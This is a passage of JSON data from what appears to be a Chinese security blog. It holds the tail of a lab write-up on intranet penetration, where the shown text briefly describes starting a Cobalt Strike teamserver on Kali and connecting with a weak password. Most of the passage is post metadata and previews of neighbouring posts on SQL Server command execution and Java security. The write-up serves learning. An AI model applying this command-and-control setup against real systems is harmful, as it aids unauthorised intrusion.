class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后还有cs的使用，cs的话首先需要kali开启teamserver</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537447.png\" alt=\"在这里插入图片描述\"><br>然后再打开cs，ip对应，密码123456即可连接</p>\n","feature":true,"text":"前言内容写的很乱，因为第一次搞，有点不太熟练，所以各位师傅简单看看就好，写的比较好的文章，可以参考这两个https://xz.aliyun.com/t/11588#toc-0https://mp.weixin.qq.com 环境搭建https://pan.baidu.com/s/...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%96%E7%BD%91\"><span class=\"toc-text\">外网</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">法一</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">法二</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#win7\"><span class=\"toc-text\">win7</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E8%A8%80\"><span class=\"toc-text\">后言</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL Server命令执行方式汇总","uid":"ad74bb09d7e0c77ac4f85f8bb423fecf","slug":"SQL Server命令执行方式汇总","date":"2023-02-11T15:51:20.000Z","updated":"2023-03-14T07:46:32.000Z","comments":true,"path":"api/articles/SQL Server命令执行方式汇总.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141545601.png","text":"前言学习内网基础时发现对Mssql的命令执行不太熟悉，因此进行了简单总结，希望对正在学习此类知识的师傅有所帮助。 环境搭建本文环境如下 服务器：windows2008 数据库：sqlserver2008 下载链接如下（复制后打开迅雷即可自动加载） ed2k://|file|cn_...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"渗透","slug":"渗透","count":2,"path":"api/categories/渗透.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JAVA安全基础入门篇","uid":"8bd1f2733cc5f9b409baa8184367dcbe","slug":"JAVA安全入门篇","date":"2023-01-19T16:51:30.000Z","updated":"2024-02-14T08:04:40.000Z","comments":true,"path":"api/articles/JAVA安全入门篇.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141603315.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/13284 JAVA 反射定义什么是JAVA 反射。接下来引用一下Y4tacker大师傅的话 Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}